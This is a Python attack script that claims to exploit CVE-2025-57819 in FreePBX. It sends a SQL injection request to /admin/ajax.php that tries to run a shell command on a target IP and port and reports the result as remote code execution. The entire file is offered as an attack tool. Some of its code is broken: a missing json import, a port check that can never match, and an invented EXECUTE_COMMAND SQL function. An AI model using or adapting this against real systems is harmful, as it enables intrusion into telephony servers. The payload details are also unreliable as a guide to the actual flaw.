#!/usr/bin/env python3
import argparse
import requests
import sys
from requests.exceptions import RequestException


COMMAND_TO_EXECUTE = "id" 
BASE_ENDPOINT = "/admin/ajax.php"

def build_sql_payload(command: str) -> str:
    """
    Construct the SQL injection string, testing the most likely syntax.
    """
    
    base_params = "module=FreePBX\\modules\\endpoint\\ajax&command=model&template=x&model=model&brand=x"

    
    payload_attempt1 = f"{base_params}' ; EXECUTE_COMMAND('{command}') -- "

    
    payload_attempt2 = f"{base_params}' OR 1=1; {command} -- "

   
    return payload_attempt1

def exploit_freepbx_breaker(ip: str, port: str, token: str = None):
    """Executes the attack by exploiting the FreePBX vulnerability (CVE-2025-57819)."""

    
    protocol = "https" if port == 443 else "http"
    target_url_base = f"{protocol}://{ip}:{port}"
    full_url = f"{target_url_base}{BASE_ENDPOINT}"

    print("="*60)
    print("Initiating Exploit CVE-2025-57819 against FreePBX...")
    print(f"Target: {full_url}")
    print(f"Command Payload: {COMMAND_TO_EXECUTE}")
    print("="*60)

    
    sql_payload = build_sql_payload(COMMAND_TO_EXECUTE)
    print(f"[+] Constructed SQL payload: {sql_payload}")

    try:
        print("\n[+] Sending GET request with SQL injection...")

        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Authorization": f"Bearer {token}" if token else ""
        }

        
        response = requests.get(
            f"{full_url}?{sql_payload}", 
            headers=headers, 
            verify=False,
            timeout=30
        )

        print("\n" + "="*60)
        print(f"[SUCCESS] Request sent. HTTP status: {response.status_code}")
        print("="*60)

        
        print("\n--- SERVER RESPONSE ANALYSIS ---")

        try:
            json_data = response.json()
            print("Response in JSON format:")
            print(json.dumps(json_data, indent=4))

            if 'output' in json_data:
                print(f"\n[INFO] Possible Command Output: {json_data['output']}")

        except requests.exceptions.JSONDecodeError:
            print("\nPlain text response (Possibly raw command output):")
            print("-" * 20)
            print(response.text)
            print("-" * 20)

        print("\n==========================================")
        if response.status_code in [200, 302]:
            print("[+] Exploitation complete. Check the output to confirm RCE.")
        else:
            print(f"[FAILURE] Request failed with HTTP status code {response.status_code}. Check the syntax: {response.text}")
        print("==========================================")

    except RequestException as e:
        print("\nERROR: Request failed. Check IP, Port, or network connection: {}".format(e))
    except Exception as e:
        print("\nAn unexpected error occurred during execution: {}".format(e))

if __name__ == "__main__":
    parser = argparse.ArgumentParser(prog='freepbx-breaker',
                                     description='Exploit designed to exploit the vulnerability in CVE-2025-57819',
                                     epilog='UwU')
    parser.add_argument('IP', help='Target IP Address')
    parser.add_argument('PORT', help='Target Port Number')
    parser.add_argument('-t', '--token', help='Bearer token if present')
    args = parser.parse_args()
    exploit_freepbx_breaker(ip=args.IP, port=args.PORT, token=args.token)
